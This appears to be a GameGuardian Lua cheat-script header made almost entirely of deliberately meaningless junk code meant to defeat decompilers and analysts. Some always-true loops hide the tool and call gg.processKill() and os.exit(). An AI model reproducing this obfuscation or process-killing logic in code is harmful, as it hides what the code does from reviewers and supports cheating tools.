					while (nil)do;local a={}if (a.a)then if (a.a.a)then if (a.a.a.a) then if(a.a.a.a.a)then if (a.a.a.a.a.a) then;a.a=(a.a(a)) a.a=(a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))) a.b = (a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))),(a.a(a.a.a(a.a.a.a(a.a.a.a.a((a.a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))))) end;end;end;end;end;end
					while nil ~=nil do;local c = {} c.c = nil,nil,nil,nil if (c.c)then;c.c=(c.c(c)) c.c=(c.c(c))end;end
				while not (nil) do gg.setVisible(false)   while true do     gg.setVisible(false)     gg.processKill()     gg.setVisible(true)     os.exit()   end   return end end
			while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
		while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
	while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local x={}if (x.x)then if (x.x.x)then;x.x=(x.x(x)) x.x=(x.x(x.x.x(x.x(x))))end;end;end
while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local a={} local b={} local c={}if (a.a) then if (a.a.a) then if (a.a.a.a) then if (a.a.a.a.a) then if (b.b) then if (b.b.b) then if (b.b.b.b) then if (c.c) then if (c.c.c) then if (c.c.c.c) then;a.a = (a.a(a)) a.a=(a.a(a.a.a(a.a(a)))) b.b = (b.b(b)) b.b=(b.b(b.b.b(b.b.b.b(b.b.b(b.b(b.b)))))) c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) local r = {a.a,b.b,c.c} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local z={} local x={} local c={}if (z.z) then if (z.z.z) then if (z.z.z.z) then if (z.z.z.z.z) then if (x.x) then if (x.x.x) then if (x.x.x.x) then if (c.c) then if (c.c.c) then if (c.c.c.c) then;z.z = (z.z(z)) z.z=(z.z(z.z.z(z.z(z)))) x.x = (x.x(x)) x.x=(x.x(x.x.x(x.x.x.x(x.x.x(x.x(x.x)))))) c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) local r = {z.z,x.x,c.c} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local f={} local g={} local h={}if (f.f) then if (f.f.f) then if (f.f.f.f) then if (f.f.f.f.f) then if (g.g) then if (g.g.g) then if (g.g.g.g) then if (h.h) then if (h.h.h) then if (h.h.h.h) then;f.f = (f.f(f)) f.f=(f.f(f.f.f(f.f(f)))) g.g = (g.g(g)) g.g=(g.g(g.g.g(g.g.g.g(g.g.g(g.g(g.g)))))) h.h = (h.h(h.h.h(h.h.h.h(h.h.h(h.h(h.h)))))) local r = {f.f,g.g,h.h} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local x={}if (x.x)then if (x.x.x)then;x.x=(x.x(x)) x.x=(x.x(x.x.x(x.x(x))))end;end;end
while (nil)do;local o={}if (o.o(o(o.o(o.oo))))then if (o.oo) then oo={} if (oo.o(oo.oo))then;o.o=(o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o,o)))))))) o={o.o,o.o,o.o,oo.o,oo.oo} p = (nil),(nil)*(nil) o.p = p,p,p,p oo.oo.o = (nil),(nil)..","..o.p..","..(nil)*(nil)/(nil)..",(nil)" _G = {oo.oo.o,_G,oo.oo.o} gg = {oo.oo.o,gg,oo.oo.o} end;end;end;end
for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
		for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
			while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
				while (nil) do;local T={}   if (T.T)then if (T.T.T)then;T.T=(T.T(T)) T.T = (T.T(T.T.T(T.T(T)))) end;end
					while (nil)do;local a={}if (a.a)then if (a.a.a)then if (a.a.a.a) then if(a.a.a.a.a)then if (a.a.a.a.a.a) then;a.a=(a.a(a)) a.a=(a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))) a.b = (a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))),(a.a(a.a.a(a.a.a.a(a.a.a.a.a((a.a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))))) end;end;end;end;end;end
					while nil ~=nil do;local c = {} c.c = nil,nil,nil,nil if (c.c)then;c.c=(c.c(c)) c.c=(c.c(c))end;end
				while not (nil) do gg.setVisible(false)   while true do     gg.setVisible(false)     gg.processKill()     gg.setVisible(true)     os.exit()   end   return end end
			while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
		while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
	while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
tg = gg
gg = nil
while (gg)do;local o={}if (o.o(o(o.o(o.oo))))then if (o.oo) then oo={} if (oo.o(oo.oo))then;o.o=(o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o,o)))))))) o={o.o,o.o,o.o,oo.o,oo.oo} p = (nil),(nil)*(nil) o.p = p,p,p,p oo.oo.o = (nil),(nil)..","..o.p..","..(nil)*(nil)/(nil)..",(nil)" _G = {oo.oo.o,_G,oo.oo.o} gg = {oo.oo.o,gg,oo.oo.o} end;end;end;end
gg =tg
tg = nil
while (tg)do;local o={}if (o.o(o(o.o(o.oo))))then if (o.oo) then oo={} if (oo.o(oo.oo))then;o.o=(o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o,o)))))))) o={o.o,o.o,o.o,oo.o,oo.oo} p = (nil),(nil)*(nil) o.p = p,p,p,p oo.oo.o = (nil),(nil)..","..o.p..","..(nil)*(nil)/(nil)..",(nil)" _G = {oo.oo.o,_G,oo.oo.o} gg = {oo.oo.o,gg,oo.oo.o} end;end;end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
